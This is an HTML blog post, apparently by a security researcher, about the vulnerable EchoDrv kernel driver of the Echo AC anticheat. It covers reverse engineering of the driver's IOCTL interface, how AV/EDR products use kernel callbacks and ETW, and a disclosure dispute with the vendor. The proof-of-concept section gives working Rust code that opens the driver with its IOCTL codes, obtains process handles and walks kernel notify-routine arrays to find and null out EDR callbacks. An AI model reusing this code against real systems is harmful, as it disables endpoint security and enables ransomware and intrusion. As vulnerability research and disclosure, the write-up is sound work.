@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Outsmarting Antivirus [Echo AC Edition] :: Terminal</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This article explores the exploitation of the EchOh-No vulnerability regarding the kernel driver of an anticheat tool used for Minecraft, Rust, FiveM and Roblox. The primary objective of this exploit is to disable antivirus and/or endpoint detection and response (EDR) defenses present on computer systems. The feasibility of this objective is demonstrated through the use of a Proof-of-Concept (PoC). " />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/echohno/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="Thottysploity" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Outsmarting Antivirus [Echo AC Edition]">
+<meta property="og:description" content="This article explores the exploitation of the EchOh-No vulnerability regarding the kernel driver of an anticheat tool used for Minecraft, Rust, FiveM and Roblox. The primary objective of this exploit is to disable antivirus and/or endpoint detection and response (EDR) defenses present on computer systems. The feasibility of this objective is demonstrated through the use of a Proof-of-Concept (PoC). " />
+<meta property="og:url" content="/posts/echohno/" />
+<meta property="og:site_name" content="Terminal" />
+
+  
+    <meta property="og:image" content="/img/favicon/orange.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-09-28 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    ThottySploity
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/echohno/">Outsmarting Antivirus [Echo AC Edition]</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-09-28</time><span class="post-author">Thottysploity</span></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="1-credits"><code>1</code> Credits<a href="#1-credits" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li><a href="https://ioctl.fail/echo-ac-writeup/">https://ioctl.fail/echo-ac-writeup/</a></li>
+<li><a href="https://github.com/wavestone-cdt/EDRSandblast">https://github.com/wavestone-cdt/EDRSandblast</a></li>
+</ul>
+<h1 id="2-introduction"><code>2</code> Introduction<a href="#2-introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>In the realm of today&rsquo;s cyberspace the adoption of an Antivirus (AV) or an Endpoint Detection and Response (EDR) software plays a crucial role in securing a computer system from malicious threats. In today&rsquo;s digital world, having an Antivirus or Endpoint Detection and Response software is like putting a lock on your door to protect your computer. While it can block less sophisticated attacks, it might not catch really sophisticated ones. Cybercrime today is like a game of catch-me-if-you-can, as attackers keep getting smarter with their methods.</p>
+<h1 id="3-functionality-user-mode-vs-kernel-mode"><code>3</code> Functionality: User-mode vs Kernel-mode<a href="#3-functionality-user-mode-vs-kernel-mode" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>A computer is built up from two different modes, user-mode and kernel-mode. When a user-mode program requests to run, a process and a virtual address space is created by Windows. Programs running in user-mode are less privileged than user-mode applications. If a user-mode application wants to access system resources, it will first have to go through the kernel by using syscalls.</p>
+<p>In kernel-mode all code shares a single virtual address space. Therefore a kernel-mode driver does not experience any isolation from other drivers. When a driver writes data to the wrong virtual address it can overwrite data belonging to another driver. If a kernel-mode driver crashes, the entire OS crashes (also known as a Blue Screen of Death (BSOD)).</p>
+
+<img src="/img/userandkernelmode01.png"  alt="usermode vs kernelmode"  class="center"  style="border-radius: 8px;"    />
+
+
+<h1 id="4-unveiling-driver-vulnerability"><code>4</code> Unveiling Driver Vulnerability<a href="#4-unveiling-driver-vulnerability" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Echo AC, or Echo AntiCheat, serves as an anti-cheat solution designed to identify and prevent cheating among users. It achieves this by conducting memory scans, examining recently visited websites, scrutinizing files within your recycle bin, and collecting a comprehensive set of data. This software, however, is notably intrusive in terms of user privacy. Game server administrators typically mandate its usage, and non-compliance may result in restrictions from accessing their game servers.</p>
+<p>Echo AC utilizes a kernel-mode driver to access data from various processes without implementing sufficient access control mechanisms to restrict which programs can communicate with this driver. Merely obtaining a handle to the driver and issuing the appropriate IOCTL codes is sufficient to have the driver fulfill your requests.</p>
+<p>With the theoretical background and backstory now set aside, let&rsquo;s delve into the operational aspects of this driver.</p>
+
+<img src="/img/driversign.png"  alt="driversign"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>When inspecting the certificate of the driver we can see a few things. The driver was signed on Wednesday 16 December, 2020 at 0:25:28 and is valid to Friday 3 December 2021. Take in mind that at the day of writing this certificate is nearly <code>2 years</code> overdue.</p>
+<p>When opening the Driver within Ghidra, we can follow the call to mmCopyVirtualMemory to the functions that uses this function. In our case only 1 reference was found to mmCopyVirtualMemory and this reference I called CopyMemory as this is what the function does.</p>
+
+<img src="/img/mmcopyvirtualmemory.png"  alt="copyvirtualmemory"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>When following the reference we get a pseudo-decompiled version of the function <code>CopyMemory</code>, I renamed some of the variables to make it more simplistic to get the feeling of what&rsquo;s going on and how it all works.</p>
+
+<img src="/img/CopyMemoryFunction.png"  alt="copymemoryfunction"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>The mmCopyVirtualMemory function parameters look like this:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">C</span>
+      <span class="collapsable-code__title">mmCopyVirtualMemory function parameters</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-C" ><code>
+NTSTATUS NTAPI MmCopyVirtualMemory
+(
+    PEPROCESS SourceProcess,
+    PVOID SourceAddress,
+    PEPROCESS TargetProcess,
+    PVOID TargetAddress,
+    SIZE_T BufferSize,
+    KPROCESSOR_MODE PreviousMode,
+    PSIZE_T ReturnSize
+);
+</code></pre>
+  </div>
+
+
+<p>Now we know what function is responsible for <code>copying and pasting</code>, we still need to figure out how we can access/use this function to our advantage.
+To see where our copy function is being used we can look for the references. When we double click our CopyMemory function we get to see the references, one of which is <code>14000197c</code> when we click this reference we will be taken to where the function is called.</p>
+
+<img src="/img/referenceCopy.png"  alt="copymemoryreference"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>When we follow this reference, we are dropped in the main part of the driver. We are able to see what is callable with IOCTL codes that we can send to the driver. It may not say much right now but we&rsquo;ll slowly walk through it.</p>
+
+<img src="/img/mainpartofdriver.png"  alt="mainpartofdriver"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>Let&rsquo;s start simple with the question, what can we see? We see a bunch of if and else statements, these if/else statements are comparing for a value and do something according to the result. These values are actually IOCTL codes (for example <code>if (iVar5 == -0x6195fa6c)</code>) to tell the driver to do a certain action, but now how do we call it?</p>
+<p>When we follow the first if else statement, we can see a comparision against a value but what is the else about? when we double click on <code>LAB_140001b03</code> we can see what the else does for us.</p>
+
+<img src="/img/ifelse.png"  alt="ifelse"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>The else statement in this case makes the driver exit, which is not something we want so we will have to make sure we&rsquo;re not exiting out of the driver.</p>
+<p>We can bypass the comparison, because we can literally see what it compares with.</p>
+
+<img src="/img/compare.png"  alt="compare"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>As the above image shows it compares the EDI register with the value <code>0x9e6a0594</code>,  we can thus call the driver using the IOCTL code of <code>0x0x9e6a0594</code> bypassing the check.
+Now to not let the driver crash upon itself we need to set a buffer which is necessary for BCrypt. We can see at the end that ppUvar2 is being set to <code>0x1000</code> which means <code>4096</code> in decimal. A buffer of 4096 should thus be sufficient for BCrypt to put it&rsquo;s data into, if we do not create this buffer the driver will cause a BSOD (Blue Screen Of Death).</p>
+<p>Let&rsquo;s apply the logic we just learned to the next <code>IOCTL</code> code we can find.</p>
+
+<img src="/img/function2.png"  alt="function2"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>As we can see the next function we can call is accessable by calling the <code>IOCTL</code> code of <code>0xe6224248</code>. Now lets take a step back and take in the view of the second function. We see <code>PsLookupProcessByProcessId</code>, <code>ObOpenObjectByPointer</code> and <code>ObfDereferenceObject</code>.</p>
+<p>From the Microsoft documentation (MSDN) page <code>PsLookupProcessByProcessId</code> function routine accepts the process ID of a process and returns a referenced pointer to the EPROCESS structure of the process. The first argument to the function is the ProcessId and the second arguement is a pointer to the EPROCESS structure of the process specified by the ProcessId. This means that <code>puVar3</code> is the ProcessId and <code>uStack344</code> is the EPROCESS structure pointer.</p>
+<p>When we clean up the decompiled code a bit we get the following:</p>
+
+<img src="/img/cleaned_up.png"  alt="cleanedupimage"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>Microsoft Documentation (MSDN) describes the following about <code>ObOpenObjectByPointer</code>, The ObOpenObjectByPointer function opens an object referenced by a pointer and returns a handle to the object. This means that this function returns a handle to the process that we are specifying by the process id.</p>
+<p>Now the most interesting part of the driver, reading and writing memory. This function can be called using the IOCTL code of: <code>0x60a26124</code> and looks like the following:
+
+<img src="/img/copymemory.png"  alt="copymemory"  class="center"  style="border-radius: 8px;"    />
+
+</p>
+<p>MSDN describes the function of <code>ObReferenceObjectByHandle</code> as the following: The ObReferenceObjectByHandle routine provides access validation on the object handle, and, if access can be granted, returns the corresponding pointer to the object&rsquo;s body. This means that the driver is checking if it has access to the process that we specified using the process id, if successful it continues with copying the memory.</p>
+<h1 id="5-edr-and-av"><code>5</code> EDR and AV<a href="#5-edr-and-av" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This paragraph explains the basic concepts concerning the inner functions of EDR and AVs and also goes in-depth in how to disable them.</p>
+<h1 id="51-innerworkings-of-edr-and-av"><code>5.1</code> Innerworkings of EDR and AV<a href="#51-innerworkings-of-edr-and-av" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Most, if not all, of todays EDR and AV solutions run in both user-mode and kernel-mode. Most antivirus and endpoint detection and response (EDR) products use API hooking in userland and callbacks/event subscriptions for kernelmode.</p>
+<p>In order to find malicious behaviour in process the AV/EDR will inject their own Dynamic Link Library (DLL). This DLL hooks Windows API calls that are frequently used for malicious activity. Since API hooks are placed within the address space of a program, that program can also access/overwrite these hooks which in turn makes the hooks placed by the AV/EDR useless. You can see why there should be a fallback option so that this can be monitored and prevented.</p>
+<p><a href="https://github.com/Mr-Un1k0d3r/EDRs">https://github.com/Mr-Un1k0d3r/EDRs</a> lists user-mode hooks for populair EDR/AV providers like CrowdStrike, SentinelOne, Bitdefender and McAfee.</p>
+
+<img src="/img/apihook.png"  alt="apihooking"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>An EDR and AV also use a kernel driver to monitor actions of the system. Since all user-mode applications have to run through the kernel this is a perfect place to position yourself as a protection provider. The reason for this is that the kernel is a bottleneck which can be utilized to give the highest order of protection.</p>
+<p>The most commonly employed callback functions by EDRs and AVs include the following:</p>
+<ul>
+<li><code>PspCreateProcessNotifyRoutine</code> for process creation;</li>
+<li><code>PspCreateThreadNotifyRoutine</code> for thread creation;</li>
+<li><code>PspLoadImageNotifyRoutine</code> for image loading;</li>
+</ul>
+<p>EDRs and AVs do not solely reply on callback functions to determine malicious actions, they can also register to get informed by Event Tracing for Windows, also known as ETW. ETW logs data usage on APIs which the EDR/AV can use to determine if specific actions are considered malicious and consequently block them.</p>
+<h1 id="6-proof-of-concept"><code>6</code> Proof-of-Concept<a href="#6-proof-of-concept" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This Proof-of-Concept shows the usage of disabling protection providers using kernel notify routine patching and etw threat disabling. It achieves this by cross referencing every driver that has a registered kernel notify routine with a set list of AV/EDR providers, when a match has been found it will null out the callback for this driver. Disabling ETW Threat provider is done by switching a bit from ENABLED (1) to DISABLED (0).</p>
+<p>The complete code can be found here: <!-- raw HTML omitted --></p>
+<p>The following code sets up the initial connection with the EchoDrv:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="2" type="checkbox"  />
+    <label for="2">
+      <span class="collapsable-code__language">Rust</span>
+      <span class="collapsable-code__title">Rust code to set up the EchoDrv initial connection</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-Rust" ><code>
+    pub unsafe fn load() -&gt; HANDLE {
+        // IOCTL Code - 0x9e6a0594
+
+        // sc create EchoDrv binpath=C:\PathToDriver.sys type= kernel &amp;&amp; sc start EchoDrv
+        let handle_driver = CreateFileW(
+            Utils::convert_string_to_mut_u16(&#34;\\\\.\\EchoDrv&#34;.to_string()),
+            GENERIC_READ | GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            null_mut(),
+            OPEN_EXISTING,
+            0,
+            0,
+        );
+
+        if handle_driver == INVALID_HANDLE_VALUE {
+            error!(&#34;Failed to load driver&#34;);
+            return 0;
+        }
+
+        let size = 4096;
+        let layout = Layout::from_size_align(size, std::mem::align_of::&lt;u8&gt;()).unwrap();
+
+        // Allocate memory on the heap and obtain a raw pointer to it
+        let buf: *mut u8 = unsafe { alloc(layout) as *mut u8 };
+
+        if DeviceIoControl(
+            handle_driver,
+            0x9e6a0594,
+            null_mut(),
+            0,
+            buf as *mut c_void,
+            4096,
+            null_mut(),
+            null_mut(),
+        ) == 0
+        {
+            error!(
+                &#34;Calling driver with: 0x9e6a0594 failed\n{}&#34;,
+                Error::last_os_error()
+            );
+            CloseHandle(handle_driver);
+
+            return 0;
+        }
+
+        // Free the buffer
+        unsafe { dealloc(buf as *mut _, layout) };
+        handle_driver
+    }
+</code></pre>
+  </div>
+
+
+<p>To continue, we get the handle to our own process, for this we use <code>GetCurrentProcessId</code> and the following fuction:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="2" type="checkbox"  />
+    <label for="2">
+      <span class="collapsable-code__language">Rust</span>
+      <span class="collapsable-code__title">Get our handle</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-Rust" ><code>
+    #[repr(C)]
+    #[derive(Copy, Clone)]
+    struct k_get_handle {
+        pid: u32,
+        access: u32,
+        handle: HANDLE,
+    }
+
+    pub unsafe fn get_handle_pid(handle_driver: HANDLE, pid: u32) -&gt; HANDLE {
+        // IOCTL Code - 0xe6224248
+
+        let mut param: k_get_handle = std::mem::zeroed();
+
+        param.pid = pid;
+        param.access = 0x10000000; // GENERIC_ALL
+
+        if DeviceIoControl(
+            handle_driver,
+            0xe6224248,
+            &amp;mut param as *const _ as *const c_void,
+            std::mem::size_of::&lt;k_get_handle&gt;() as u32,
+            &amp;mut param as *mut _ as *mut c_void,
+            std::mem::size_of::&lt;k_get_handle&gt;() as u32,
+            null_mut(),
+            null_mut(),
+        ) == 0
+        {
+            error!(
+                &#34;Calling driver with: 0xe6224248 failed\n{}&#34;,
+                Error::last_os_error()
+            );
+            CloseHandle(handle_driver);
+            return 0;
+        }
+
+        param.handle
+    }
+</code></pre>
+  </div>
+
+
+<p>Now comes the fun part, enumerating the edr drivers that use callbacks for process, thread and image creation. The code is a bit long, so I will disect it a bit to make it more understandable.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="3" type="checkbox"  />
+    <label for="3">
+      <span class="collapsable-code__language">Rust</span>
+      <span class="collapsable-code__title">Getting the right offsets</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-Rust" ><code>
+	let (_, create_process, create_thread, load_image, _, _, _, _, _, _, _) = Offsets::get_offsets(ntos_kernel_version);
+        let routines = vec![&#34;CreateProcess&#34;, &#34;CreateThread&#34;, &#34;LoadImage&#34;];
+        let offsets = vec![create_process, create_thread, load_image];
+        let mut counter = 0;
+</code></pre>
+  </div>
+
+
+<p>We get the right offsets from our predefined offset list, as this is only a Proof-of-Concept I have not made it dynamic and all offsets are static. Even though the offsets are all hardcoded, it supports over 600 different windows kernel versions.
+Firstly we parse our ntos kernel version to the offsets functions, which returns the offsets for CreateProcess, CreateThread and LoadImage routines.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="4" type="checkbox"  />
+    <label for="4">
+      <span class="collapsable-code__language">Rust</span>
+      <span class="collapsable-code__title">Making our routines</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-Rust" ><code>
+	for routine in routines {
+                let psp_routine = Utils::make_psp_routine(routine);
+                let psp_routine_addr = Utils::get_notify_address(ntos_kernel_base_address, offsets[counter] as usize);
+</code></pre>
+  </div>
+
+
+<p>Secondly we loop through our three routines, create the right name for them (which is just a <code>format!(&quot;Psp{}NotifyRoutine&quot;, routine)</code>) and get the address of our routine. The address is gotten from leaking our ntos kernel base address and adding the routine offset to it. So let&rsquo;s say our base address is 0 and our routine offset is at 100 our routine address becomes 100, as 0 + 100 = 100.</p>
+<p>Lastly, where the magic happends:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="5" type="checkbox"  />
+    <label for="5">
+      <span class="collapsable-code__language">Rust</span>
+      <span class="collapsable-code__title">Enumerating Drivers through callbacks</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-Rust" ><code>
+	for i in 0..64 {
+                    let mut call_back_struct: u64 = 0;
+                    let size = std::mem::size_of_val(&amp;call_back_struct) as u64;
+                    Driver::memory(driver_handle, (psp_routine_addr &#43; (i * 8)) as u64, &amp;mut call_back_struct, size, own_process_handle);
+
+                    if call_back_struct != 0 {
+                        let callback = (call_back_struct &amp; !0b1111) &#43; 8;
+                        let mut function: u64 = 0;
+                        let size = std::mem::size_of_val(&amp;function) as u64;
+
+                        Driver::memory(driver_handle, callback, &amp;mut function, size, own_process_handle);
+                        
+                        let mut driver_offset: u64 = 0;
+                        let driver_name = Utils::get_driver(function, &amp;mut driver_offset);
+
+                        if !driver_name.clone().is_empty() &amp;&amp; Utils::is_driver_name_edr(driver_name.clone()) {
+                            let call_back_addr: u64 = (psp_routine_addr &#43; (i * 8)) as u64;
+
+                            edr_drivers.push(FoundEdrDrivers {
+                                driver_name: driver_name.clone(),
+                                routine: psp_routine.to_string(),
+                                call_back_func: function,
+                                call_back_struct: call_back_struct,
+                                call_back_struct_addr: call_back_addr,
+                                removed: false,
+                            });
+                        }
+                    }
+                }
+</code></pre>
+  </div>
+
+
+<p>It looks like a lot doesn&rsquo;t it? yeah you&rsquo;re right, but let&rsquo;s see if we can clear this up!
+The Psp create notify routine creates an array of &lt; 64 items, hence why we loop through 64 iterations.
+The first 8 bytes represent an <code>EX_RUNDOWN_REF structure</code>, so we can jump past them to get the address of the callback function inside of a driver.</p>
+<p>If the driver is found to be an EDR associated driver, it gets added to a vector containing information about the Driver. To patch or null the driver from this array, we only have to overwrite the call back struct addr with 0.</p>
+<p>So how does this look in practice? well something like this:</p>
+
+<img src="/img/running.png"  alt="running poc"  class="center"  style="border-radius: 8px;"    />
+
+
+<h1 id="7-responsible-disclosure-mitigating-risks"><code>7</code> Responsible Disclosure: Mitigating Risks<a href="#7-responsible-disclosure-mitigating-risks" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>As part of my research, I firstly inform the supplier of software before making a post about it. For this reason I waited roughly two months with writing this blogpost. When I joined Echo AntiCheat&rsquo;s official discord I was directly met with an announcement, see below. Within the announcement Echo Anticheat makes a couple bold statements; The driver is automatically deleted following usage, poses no security risk to the user, considered standard practices at the time, there is no CVE and all vulnerabilities related to this product <code>EchoDrv</code> are only based on inaccuracies and rumors.</p>
+
+<img src="/img/CVE.png"  alt="cve"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>There is indeed not a CVE for the EchoDrv vulnerability <code>yet</code>, but that&rsquo;s why we have the Common Vulnerability Scoring System or CVSS for short. CVSS lets you calculate a score from 0-10 on how critical a vulnerability is. The CVSS score for EchoDrv is a <code>8.2</code> denoted as a high vulnerability (<a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)">https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)</a>.</p>
+<p>The driver may be deleted automatically with the original usermode anticheat, this is not the case for software abusing this driver to either cheat, privilege escalate, protect processes or incapacitate AV/EDR. This vulnerability does not only pose a <code>severe</code> risk to the overall security of the systems of users but also those of companies! Just take a look at this article where a ransomware groups abuses a abritrary read/write (just like in EchoDrv) to disable AV/EDR to deploy ransomware: <a href="https://www.bleepingcomputer.com/news/security/blackbyte-ransomware-abuses-legit-driver-to-disable-security-products/">https://www.bleepingcomputer.com/news/security/blackbyte-ransomware-abuses-legit-driver-to-disable-security-products/</a></p>
+<p>Anyways, enough ranting here is the complete chat I had with Josh from Echo Anticheat.</p>
+
+<img src="/img/josh1.png"  alt="josh"  class="center"  style="border-radius: 8px;"    />
+
+
+
+<img src="/img/josh2.png"  alt="josh2"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>After this little chat I met the same faith as the first security researcher, banned from their discord server for trying to disclose a vulnerability.</p>
+<p>Thank you for reading this write up and I want to close this blog post with a qoute which I found to be very fitting for this situation:</p>
+<p>&ldquo;Facts do not cease to exist because they are ignored&rdquo; - Aldous Huxley</p>
+<h1 id="8-references"><code>8</code> References<a href="#8-references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li><a href="https://ioctl.fail/echo-ac-writeup/">https://ioctl.fail/echo-ac-writeup/</a></li>
+<li><a href="https://www.geeksforgeeks.org/difference-between-user-mode-and-kernel-mode/">https://www.geeksforgeeks.org/difference-between-user-mode-and-kernel-mode/</a></li>
+<li><a href="https://github.com/wavestone-cdt/EDRSandblast">https://github.com/wavestone-cdt/EDRSandblast</a></li>
+<li><a href="https://www.adlice.com/making-an-antivirus-engine-the-guidelines/">https://www.adlice.com/making-an-antivirus-engine-the-guidelines/</a></li>
+<li><a href="https://codemachine.com/articles/kernel_callback_functions.html">https://codemachine.com/articles/kernel_callback_functions.html</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid">https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obreferenceobjectbyhandle">https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obreferenceobjectbyhandle</a></li>
+<li><a href="https://medium.com/@matterpreter/mimidrv-in-depth-4d273d19e148">https://medium.com/@matterpreter/mimidrv-in-depth-4d273d19e148</a></li>
+</ul>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/masqpeb/">
+                <span class="button__text">Masquerading Process Environment Block (PEB) using Rust</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
